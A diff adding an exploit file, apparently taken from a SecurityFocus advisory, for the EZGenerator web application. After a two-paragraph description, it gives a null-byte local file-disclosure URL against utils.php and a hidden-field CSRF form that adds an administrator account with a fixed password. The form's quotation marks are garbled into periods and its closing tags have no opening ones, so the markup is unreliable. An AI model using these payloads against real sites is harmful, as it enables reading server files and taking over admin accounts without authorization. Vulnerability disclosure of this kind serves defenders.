@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/64740/info
+
+EZGenerator is prone to a local file-disclosure vulnerability and a cross-site request-forgery vulnerability.
+
+An attacker may leverage these issues to perform unauthorized actions in the context of a logged-in user, or obtain sensitive information from local files on computers running the vulnerable application. This may aid in further attacks. 
+
+Local File Disclosure:
+=====================
+www.example.com/utils.php?action=download&filename=file.php%00
+
+CSRF [Add Admin]:
+================
+
+<form method=.POST. name=.form0. action=.
+http://www.example.com/centraladmin.php?process=processuser.>
+<input type=.hidden. name=.flag. value=.add./>
+<input type=.hidden. name=.old_username. value=."/>
+<input type=.hidden. name=.username. value=.admin./>
+<input type=.hidden. name=.name. value=.mm./>
+<input type=.hidden. name=.sirname. value=.hh./>
+<input type=.hidden. name=.email. value=.email@live.com./>
+<input type=.hidden. name=.password. value=.12121212./>
+<input type=.hidden. name=.repeatedpassword. value=.12121212./>
+<input type=.hidden. name=.select_all. value=.yes./>
+<input type=.hidden. name=.access_to_page47. value=.2./>
+<input type=.hidden. name=.save. value=.Save./>
+</form>
+</body>
+</html>
+
+
